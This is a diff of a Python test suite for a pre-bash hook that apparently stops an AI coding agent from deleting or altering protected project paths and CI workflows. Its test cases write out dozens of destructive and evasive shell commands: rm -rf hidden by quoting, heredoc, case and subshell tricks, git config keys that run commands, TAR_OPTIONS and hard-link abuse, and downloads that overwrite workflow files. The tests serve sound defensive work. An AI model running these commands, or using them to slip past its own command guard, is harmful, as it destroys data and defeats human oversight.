+        with tempfile.TemporaryDirectory() as plain:              # not an ancestor of the plugin or of home
+            self.allowed([f"cd {plain} && wget https://e.x/f", f"git clone --depth 1 https://x/y {plain}/y"])
+
+
+class Round4(ProtectedTree):
+    """0005 review round 4: regressions against main first (escaped backslash, `function f {`), then the classes."""
+    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None
+
+    def blocked(self, cmds, rid=None):
+        for cmd in cmds:
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
+            if rid:
+                self.assertIn(f"[{rid}]", r.stderr, cmd)
+
+    def allowed(self, cmds):
+        for cmd in cmds:
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
+
+    def test_escaped_backslash_is_a_backslash(self):        # CRITICAL regression: blocked on main
+        self.blocked(["true \\\; rm -rf .aiops", "echo a\\\;rm -rf .aiops", "true \\\\\\\; rm -rf .aiops"], "G-ART-05")
+        self.blocked(["printf %s \\\; rm -rf .github"], "G-FILE-05")
+        self.blocked(["find .aiops \\\\\\( -type f \\\\\\) -delete"])          # \\\( : a backslash, then an escaped (
+        self.allowed(["echo \; ls", "echo 'a\;b'"])
+
+    def test_function_keyword_body(self):                   # HIGH regression: blocked on main
+        self.blocked(["function f { rm -rf .aiops; }; f"], "G-ART-05")
+
+    def test_git_keys_and_variables_that_run_commands(self):
+        self.blocked(["git -c diff.external='rm -rf docs' diff", "git -c core.fsmonitor='rm -rf docs' status",
+                      "git -c credential.helper='!rm -rf docs' fetch", "git -c mergetool.x.cmd='rm -rf docs' mergetool",
+                      "git -c gpg.program='rm -rf docs' commit -S", "git -c filter.x.clean='rm -rf docs' add .",
+                      "git -c uploadpack.packObjectsHook='rm -rf docs' fetch", "git -c core.askPass='rm -rf docs' fetch",
+                      "GIT_EXTERNAL_DIFF='rm -rf docs' git diff", "GIT_ASKPASS='rm -rf docs' git fetch"])
+        self.allowed(["git -c core.editor=vim commit -m x", "git -c credential.helper=store fetch"])
+
+    def test_remote_name_downloads(self):
+        self.blocked(["cd .github/workflows && curl -O https://e.x/aiops-gates.yml",
+                      "cd .github/workflows && wget https://e.x/aiops-gates.yml",
+                      "cd .github/workflows && curl -sSLO https://e.x/aiops-gates.yml"])
+        self.allowed(["cd build && curl -O https://e.x/out.o", "wget https://e.x/readme.txt"])
+
+    def test_hard_link_dirs_and_link(self):
+        self.blocked(["cp -al .github /tmp/gh", "cp -rl .github /tmp/gh", "cp -la .github /tmp/gh",
+                      "link .github/workflows/aiops-gates.yml hl", "rsync -a --link-dest=$PWD/.github src/ /tmp/b"])
+        self.allowed(["cp -al build /tmp/b2"])
+
+    def test_find_exec_writers(self):
+        self.blocked(["find .github -name '*.yml' -exec cp /dev/null {} \;", "find .github -name '*.yml' -exec sed -i d {} +",
+                      "find .github -name '*.yml' -exec tee {} \;"])
+        self.allowed(["find . -name '*.py' -exec sed -i s/a/b/ {} +"])
+
+    def test_positional_forms(self):
+        self.blocked(["bash -c 'rm -rf \"${@}\"' _ docs", "bash -c 'for d; do rm -rf \"$d\"; done' _ docs",
+                      "bash -c 'shift; rm -rf \"$1\"' _ x docs"])
+        self.allowed(["bash -c 'echo \"$@\"' _ build"])
+
+    def test_more_wrappers(self):
+        self.blocked(["runuser -u me -- rm -rf docs", "watch -n1 -- bash -c 'rm -rf docs'",
+                      "parallel -j 2 --halt now,fail=1 rm -rf ::: docs", "git submodule foreach --recursive 'rm -rf ../docs'",
+                      "git submodule --quiet foreach 'rm -rf ../docs'"])
+
+    def test_tar_options_and_tilde_links(self):
+        Incoming.archive(self, "strip.tgz", ["pkg/.aiops/config/allowed-commands"])
+        self.blocked(["TAR_OPTIONS=--strip-components=1 tar -xzf strip.tgz", "TAR_OPTIONS='--transform=s/a/b/' tar -xzf strip.tgz",
+                      "export TAR_OPTIONS=--strip-components=1; tar -xzf strip.tgz"])
+
+    def test_time_of_check_after_arbitrary_commands(self):
+        Incoming.archive(self, "good.tgz", ["src/a.py"])
+        git(self.root, "branch", "benign")
+        self.blocked(["make fetch && tar -xzf good.tgz", "./get.sh && tar -xzf good.tgz", "make setup && git merge benign",
+                      "git -c remote.origin.fetch=+refs/heads/x:refs/remotes/origin/main fetch && git merge origin/main"])
+        self.allowed(["ls && tar -xzf good.tgz", "echo go && git merge benign", "tar -xzf good.tgz -C build"])
+
+    def test_untracked_nested_protected_files(self):
+        (self.root / ".aiops" / "config" / "protected-paths").write_text("docs/CODEOWNERS x\n.github/* ci\n")
+        self.blocked(["find . \\( -name '*.yml' \\) -delete"])
+
+
+class Round4Uninitialized(Uninitialized):
+    test_safety_pass_blocks = test_gates_stay_dormant = None
+
+    def test_safety_pass_round4(self):
+        for cmd in ("function f { cp /tmp/b ~/.bashrc; }; f", "true \\\; cp /tmp/b ~/.bashrc", "ln -s ~ h && tar -xzf h.tgz -C h",
+                    "TAR_OPTIONS=-C$HOME tar -xzf h.tgz", "link ~/.gitconfig /tmp/g"):
+            r = self.engine(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stdout}{r.stderr}")
+
+
+class TokenizerRound5(ProtectedTree):
+    """Promoted from review round 5 (zoujagger): three tokenizer holes already on main that hid a whole command."""
+    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None
+
+    def test_merged_punctuation(self):
+        for cmd, rid in [("echo $(date); rm -rf .github", "G-FILE-05"), ("(true); rm -rf .aiops", "G-ART-05"),
+                         ("(echo a);rm -rf .aiops", "G-ART-05"), ("echo $(echo a); rm -rf .aiops", "G-ART-05"),
+                         ("(ls)&&rm -rf .aiops", "G-ART-05"), ("(ls)|rm -rf .aiops", "G-ART-05")]:
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
+            self.assertIn(f"[{rid}]", r.stderr, cmd)
+
+    def test_line_continuation(self):
+        for cmd, rid in [("rm -rf \\\n.aiops", "G-ART-05"), ("echo x > \\\n.aiops/config/allowed-commands", "G-ART-05"),
+                         ("rm -rf \\\n.github", "G-FILE-05"), ('echo "a" && rm \\\n-rf .aiops', "G-ART-05")]:
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd!r}: {r.stderr}")
+            self.assertIn(f"[{rid}]", r.stderr, cmd)
+
+    def test_ansi_c_quotes(self):
+        for cmd in ("echo $'\\'' ; rm -rf .aiops ; echo $'\\'' #'", "echo $'a\\'b' ; rm -rf .aiops"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
+            self.assertIn("[G-ART-05]", r.stderr, cmd)
+
+    def test_ordinary_syntax_still_allowed(self):
+        for cmd in ("case x in a) echo a;; b) echo b;; esac", "echo $(date)", "echo 'a\\\nb'", "printf $'a\\tb\\n'",
+                    "if true; then (cd src && ls); fi", "ls \\\n  -la", "x=$(ls); echo $x", "echo $'it\\'s'"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd!r}: {r.stderr}")
+
+
+class TokenizerRecheck(ProtectedTree):
+    """Targeted re-check of b698d39: the pre-tokenizer must know comments and heredoc bodies (two regressions
+    against main, R1 and R2), split `)` off a redirection, and scope a subshell's cd exactly."""
+    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None
+
+    def test_regressions_against_main(self):
+        for cmd in ("cat <<'EOF'\nx \\\nEOF\nrm -rf .aiops",          # R1: a quoted heredoc body isn't joined
+                    "echo hi # $'\\'\nrm -rf .aiops"):                 # R2: $' in a comment isn't a quote
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd!r}: {r.stderr}")
+            self.assertIn("[G-ART-05]", r.stderr, cmd)
+
+    def test_continuation_after_heredoc_and_comment_apostrophes(self):
+        for cmd in ("cat <<EOF\nit's\nEOF\nrm -rf \\\n.aiops", "echo hi # it's\nrm -rf \\\n.aiops",
+                    "echo hi # it's\nrm -rf .aiops\necho '"):          # a quote in a comment pairs with nothing
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd!r}: {r.stderr}")
+            self.assertIn("[G-ART-05]", r.stderr, cmd)
+
+    def test_paren_merged_with_redirection(self):
+        for cmd in ("(echo x)>.aiops/config/allowed-commands", "(echo x)>>.aiops/config/allowed-commands",
+                    "(echo x)&>.aiops/config/allowed-commands"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
+
+    def test_subshell_cd_is_scoped(self):
+        # a subshell's cd is not scoped (0005 review round 9): `(cd src); rm -rf .aiops` is judged in src, as on
+        # main; exact scoping is left to intent 0006 (docs/architecture.md residuals)
+        for cmd in ("(cd .github && rm -rf workflows)", "cd .github && (rm -rf workflows)"):
+            self.assertEqual(self.bash(cmd).returncode, 2, cmd)
+        for cmd in ("(cd build && rm -rf *)", "(cd /tmp/work && tar -xzf release.tgz)", "(cd /tmp/work && unzip pkg.zip)",
+                    "(cd /tmp/clone && rm -rf .git)", "(cd /tmp && rm -rf docs build)", "(cd /tmp/w && rm -rf .aiops)",
+                    "(cd /tmp/w && echo x > .aiops/config/x)", "cd $(mktemp -d) && rm -rf .git",
+                    "pushd /tmp/w && (rm -rf docs) && popd", "(cd build && make)", "(cd src && rm -rf node_modules)"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
+
+
+class ReviewRound6(ProtectedTree):
+    """0005 review round 6: three regressions against main in the 4e18711 tokenizer (`#` after `)` read as a comment,
+    `time -p` losing command position, a `case` pattern `)` closing the subshell scope) and the heredoc delimiter
+    read as `\\w+` (already on main)."""
+    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None
+
+    def blocked(self, cmds, rule="G-ART-05"):
+        for cmd in cmds:
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd!r}: {r.stderr}")
+            self.assertIn(f"[{rule}]", r.stderr, cmd)
+
+    def allowed(self, cmds):
+        for cmd in cmds:
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd!r}: {r.stderr}")
+
+    def test_hash_that_is_not_a_comment(self):
+        self.blocked(f"{pre}; rm -rf .aiops" for pre in (
+            "echo $(true)#", "echo $((1))#", "cat <(true)#", "x=(a)#", "echo `true #`", 'echo "$(echo " #")"',
+            'echo "${x:-" #"}"', "echo $(true)\\\n#"))
+        self.allowed(("make check  # run the tests", "echo hi # it's\nls", "(true)# a plain subshell"))
+        # defence in depth: once a comment is dropped, the line is also judged with every `#` kept as a word, as main
+        # read it: a real separator a misread comment hid shows, and a comment's text stays an argument (round 7)
+        self.allowed(("(true)# rm -rf .aiops", "ls src  # touch nothing yet"))
+
+    def test_time_keeps_command_position(self):
+        self.blocked(("time -p { rm -rf .aiops; }", "! time -p { rm -rf .aiops; }", "time -- { rm -rf .aiops; }",
+                      "time -p ! rm -rf .aiops"))
+        self.allowed(("find . ! -name x -print", "time -p make check"))
+
+    def test_case_pattern_paren_is_not_a_scope(self):
+        self.blocked((f"cd /tmp; ( cd {self.root}; case a in a) ;; esac; rm -rf .aiops )",
+                      "case a in (a) ;; esac; rm -rf .aiops"))
+        self.blocked(("( cd .github && case a in a) true;; esac && rm -rf workflows )",), rule="G-FILE-05")
+        self.allowed(("(cd /tmp/w); case a in a) ;; esac; ls",))
+        self.allowed(("(cd build && case a in a) true;; esac && rm -rf *)",))   # round 9: no scopes, no false positive
+
+    def test_only_the_case_keyword_starts_a_case(self):
+        """Review round 7 (CRITICAL, regression against main): a quoted, escaped or redirected `case` is an ordinary
+        command in bash, and words are never dropped: a `$(…)` in a case pattern runs."""
+        self.blocked(("\\case x in ; ( rm -rf .aiops )", '"case" x in ; ( rm -rf .aiops )',
+                      "'case' x in\n( rm -rf .aiops )", ">/dev/null case x in ; ( rm -rf .aiops )",
+                      "case x in $(rm -rf .aiops)) true;; esac",
+                      "case x in x) true;; $(rm -rf .aiops)) true;; esac", "case x in (y|$(rm -rf .aiops)) ;; esac"))
+        self.blocked(("\\case x in ; ( rm -rf .github )", "ca''se x in ; ( rm -rf .github )",
+                      "( cd .github && case a\nin a) true;; esac && rm -rf workflows )",
+                      "( cd .github && case $(echo a) in a) true;; esac && rm -rf workflows )",
+                      "( cd .github && case `echo a` in a) true;; esac && rm -rf workflows )",
+                      "( cd .github && if :; then case a in a) :;; esac; fi && rm -rf workflows )"), rule="G-FILE-05")
+        self.allowed(("case $1 in -h|--help) echo usage;; *) make check;; esac", "echo case in point",
+                      "case x in (a) ls;; esac"))
+
+    def test_quoted_words_cannot_fake_a_case(self):
+        """Review round 8 (CRITICAL, regression against main): a quoted `'a()'`, `'if'` or `"time"` put a real `case`
+        in command position; the subshell read as its pattern was dropped. Pattern words are now judged, and any line
+        with a case is judged again without case tracking."""
+        self.blocked((f"{pre} case x in ; ( rm -rf .aiops ) ; {pre} esac"
+                      for pre in ("echo 'a()'", "'if'", '"time"', 'echo "f()"')))
+        self.blocked(("echo \"f()\" case x in\n( rm -rf .aiops )\necho \"f()\" esac",))
+        self.blocked(("echo 'a()' case x in ; ( rm -rf .github ) ; echo 'a()' esac",), rule="G-FILE-05")
+
+    def test_case_desync_matrix(self):
+        """Review round 8 (code review): the class, not the spellings. Prefixes that bash doesn't read as putting
+        `case` in command position, crossed with quoted operators inside a real case body, each wrapping a subshell
+        that deletes `.aiops`."""
+        prefixes = ("\\case x in ;", '"case" x in ;', ">&2 case x in ;", "2>&1 case x in ;", ">/dev/null case x in ;",
+                    "echo 'a()' case x in ;", "'if' case x in ;", '"time" case x in ;', "ca''se x in ;")
+        closers = ("", "; >&2 esac", "; 2>&1 esac", "; echo 'a()' esac", "; 'if' esac")
+        cmds = [f"{p} ( rm -rf .aiops ) {c}" for p in prefixes for c in closers]
+        cmds += [f"case x in x) echo {q} ; ( rm -rf .aiops ) ;; esac" for q in ("';;'", "')'", "'|'", "'('", '";;"')]
+        cmds += [f"( cd .github; case a in a) ;; esac; {p} ( rm -rf workflows ) ; >&2 esac )" for p in prefixes[:4]]
+        for cmd in cmds:
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd!r}: {r.stderr}")
+
+    def test_scope_desync_matrix(self):
+        """Review round 9 (BLOCKER, regression against main): a `)` that bash reads inside a word (backticks, `${…}`)
+        ended the subshell scope early. A line with scopes is also judged as main read it (every cd persists)."""
+        inner = ("echo `)`", "echo `(`", "echo ${x/)/}", "echo ${x:-)}", "echo `case x in x) echo hi;; esac`")
+        self.blocked(f"cd /tmp && (cd {self.root} && {i} && rm -rf .aiops)" for i in inner)
+        self.blocked((f"(cd .github && {i} && rm -rf workflows)" for i in inner), rule="G-FILE-05")
+        self.allowed(("(cd src && ls `pwd`)", "echo ${x:-)}; ls", "(cd /tmp/w && echo hi && rm -rf .aiops)"))
+        self.allowed(("(cd /tmp/w && echo `)` && rm -rf .aiops)",))
+        # round-9 re-check (HIGH, regression against main): a link recorded in one reading must not carry over into
+        # the next, where it would redirect an earlier target through a link bash hasn't made yet
+        parent = self.root.parent
+        self.blocked(f"cd /var && (cd {self.root} && {i} && rm -rf .aiops); ln -sfn /x/safe {link}"
+                     for i in inner[:3] for link in (self.root, parent))
+        self.blocked((f"cd /var && (cd {self.root}/.aiops && echo `)` && echo x > config/allowed-commands); "
+                      f"ln -s /x/safe {parent}",))
+        # round-9 re-check 3 (HIGH, regression against main), unlocked: an assignment before a `)` that bash keeps
+        # inside a word must still be substituted
+        self.blocked(f"(d=.aiops e={e}; rm -rf $d)" for e in ("${x/)/}", "${x:-)}", "`)`"))
+        self.blocked(("(d=.aiops/config/protected-paths e=${x/)/}; echo hi > $d)",))
+        # security review round 9 (HIGH, regression against main): `(…)#` comments holding `(`/`)` fake a subshell
+        self.blocked(("(true)# (\ncd .aiops\n(true)# )\nrm -rf config/protected-paths",
+                      "(true)# (\ncd .aiops\n(true)# )\necho x > config/allowed-commands"))
+
+    def test_heredoc_delimiters_as_bash_words(self):
+        self.blocked(("cat <<E-O\nx\nE-O\nrm -rf .aiops", "cat <<'E'OF\nx\nEOF\nrm -rf .aiops",
+                      'cat <<EOF"x"\nx\nEOFx\nrm -rf .aiops', "cat <<EOF.x\nx\nEOF.x\nrm -rf .aiops",
+                      'echo "$(echo "<<EOF")"\nrm -rf .aiops', "echo $[1<<EOF]\nrm -rf .aiops",
+                      "cat <<NEVER\nx\nrm -rf .aiops"))                 # no delimiter line: the rest is still read
+        self.allowed(("cat <<'EOF' > notes.md\nrm -rf .aiops\nEOF", "cat <<-E-O\n\trm -rf .aiops\n\tE-O"))
+
+
+class CommentsWhenLocked(RepoCase):
+    """Review round 7 (MAJOR): in the locked states main allows a comment that names a write; the second reading
+    (comments kept) must not turn the comment's text into a command."""
+    def test_comment_text_is_no_command(self):
+        for cmd in ("ls src  # touch nothing yet", "git log --oneline -5 # mv these into the changelog later",
+                    "make check  # install deps first if this fails"):
+            r = self.hook("pre-bash", self.hook_input("Bash", command=cmd), env={"CLAUDE_PROJECT_DIR": str(self.root)})
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
+        for cmd in ("ls # x\ntouch src/app.py", f"cd /tmp && (cd {self.root} && echo `)` && touch src/app.py)",
+                    f"cd /tmp && (cd {self.root} && echo ${{x/)/}} > src/app.py)",    # round 9: scope desync
+                    f"cd /var && (cd {self.root} && echo `)` && touch src/app.py); ln -sfn /x/safe {self.root}"):
+            r = self.hook("pre-bash", self.hook_input("Bash", command=cmd), env={"CLAUDE_PROJECT_DIR": str(self.root)})
+            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")    # the lock itself still holds
+            self.assertIn("[G-LOCK-02]", r.stderr, cmd)
+
+    def test_subshell_assignments_stay_inside(self):
+        """Round-9 second re-check (HIGH, regression against main): an assignment in `( … )` or `$( … )` doesn't
+        reach the commands after it, also when a `)` inside backticks fools the scope tracking."""
+        for cmd in ("d=src/app.py; (d=/tmp/x); echo hi > $d", "d=src/app.py; x=$(d=/tmp/x); echo hi > $d",
+                    "d=src/app.py; { (d=/tmp/x); }; echo hi > $d", "d=src/app.py; (export d=/tmp/x); echo hi > $d",
+                    "d=src/app.py; (echo `)`; d=/tmp/x); echo hi > $d"):
+            r = self.hook("pre-bash", self.hook_input("Bash", command=cmd), env={"CLAUDE_PROJECT_DIR": str(self.root)})
+            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
+            self.assertIn("[G-LOCK-02]", r.stderr, cmd)
+        for cmd in ("(d=src; ls $d)", "d=/tmp/x; (cd src && make); echo hi > $d"):
+            r = self.hook("pre-bash", self.hook_input("Bash", command=cmd), env={"CLAUDE_PROJECT_DIR": str(self.root)})
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
+
+
+class IncomingRound6(Incoming):
+    """0005 review round 6 (MINOR): a commit already on main is trusted like main itself, so `git cherry-pick main~1`
+    isn't refused for the config it carries; a commit only on another branch still is."""
+    test_archives = test_stash = test_merge_rebase_cherry_pick = test_pull = None
+
+    def test_cherry_pick_of_a_main_commit(self):
+        bad = self.commit_on("x", ".aiops/config.json", '{"approval_key_policy": "any"}\n')
+        main_change = self.commit_on("tmp-main", ".aiops/config.json", "{}\n", base="main")
+        git(self.root, "branch", "-qf", "main", main_change)
+        for cmd in (f"git cherry-pick {main_change}", "git cherry-pick main", f"git cherry-pick {main_change}^..main"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
+        for cmd in (f"git cherry-pick {bad}", f"git cherry-pick {main_change} {bad}", "git cherry-pick main..x"):
+            self.assertBlocked(cmd)
+
+
 if __name__ == "__main__":
     unittest.main()
